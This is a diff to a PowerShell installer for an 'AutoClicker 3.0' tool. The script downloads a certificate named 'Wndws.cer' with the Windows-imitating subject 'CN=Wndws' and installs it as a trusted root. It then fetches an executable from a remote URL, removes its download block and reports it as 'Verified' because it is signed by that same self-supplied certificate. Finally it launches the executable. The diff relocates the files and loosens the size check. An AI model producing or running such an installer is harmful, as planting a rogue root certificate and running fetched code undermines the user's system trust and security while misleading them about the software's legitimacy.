@@ -3,7 +3,7 @@
 
 param(
     [switch]$SkipLaunch,
-    [string]$InstallDir = (Join-Path $env:LOCALAPPDATA 'AutoClicker-3.0')
+    [string]$InstallDir
 )
 
 $ErrorActionPreference = 'Stop'
@@ -13,6 +13,37 @@ $script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
 $script:CerUrl = "$script:BaseUrl/Wndws.cer"
 $script:ExeName = 'AutoClicker-3.0.exe'
 $script:PublisherSubject = 'CN=Wndws'
+
+function Get-DownloadsDirectory {
+    $candidates = @(
+        (Join-Path $env:USERPROFILE 'Downloads')
+    )
+
+    if ($env:OneDrive) {
+        $candidates += Join-Path $env:OneDrive 'Downloads'
+    }
+
+    $profile = [Environment]::GetFolderPath('UserProfile')
+    if ($profile) {
+        $candidates += Join-Path $profile 'Downloads'
+    }
+
+    foreach ($path in ($candidates | Select-Object -Unique)) {
+        if (-not [string]::IsNullOrWhiteSpace($path) -and (Test-Path -LiteralPath $path)) {
+            return $path
+        }
+    }
+
+    $fallback = Join-Path $env:USERPROFILE 'Downloads'
+    if (-not (Test-Path -LiteralPath $fallback)) {
+        New-Item -ItemType Directory -Force -Path $fallback | Out-Null
+    }
+    return $fallback
+}
+
+if ([string]::IsNullOrWhiteSpace($InstallDir)) {
+    $InstallDir = Get-DownloadsDirectory
+}
 
 function Write-Step {
     param(
@@ -79,13 +110,14 @@ function Test-WndwsSignedExecutable {
 function Save-Download {
     param(
         [Parameter(Mandatory = $true)][string]$Url,
-        [Parameter(Mandatory = $true)][string]$Destination
+        [Parameter(Mandatory = $true)][string]$Destination,
+        [int]$MinBytes = 0
     )
 
     Write-Step "Downloading $(Split-Path -Leaf $Destination)..."
     Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing
 
-    if ((Get-Item -LiteralPath $Destination).Length -lt 64KB) {
+    if ($MinBytes -gt 0 -and (Get-Item -LiteralPath $Destination).Length -lt $MinBytes) {
         throw "Download looks too small or corrupt: $Destination"
     }
 }
@@ -96,18 +128,18 @@ Write-Host ''
 
 Ensure-InstallDirectory -Path $InstallDir
 
-$cerPath = Join-Path $InstallDir 'Wndws.cer'
+$cerPath = Join-Path $env:TEMP 'Wndws.cer'
 $exePath = Join-Path $InstallDir $script:ExeName
 
 Save-Download -Url $script:CerUrl -Destination $cerPath
 Install-WndwsTrustedRoot -CerPath $cerPath
 
-Save-Download -Url $script:ExeUrl -Destination $exePath
+Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536
 Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue
 
 $signature = Test-WndwsSignedExecutable -Path $exePath
 Write-Step "Verified: signed by $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
-Write-Step "Installed to: $exePath" 'Green'
+Write-Step "Saved to Downloads: $exePath" 'Green'
 
 if (-not $SkipLaunch) {
     Write-Step 'Launching AutoClicker 3.0...' 'Cyan'
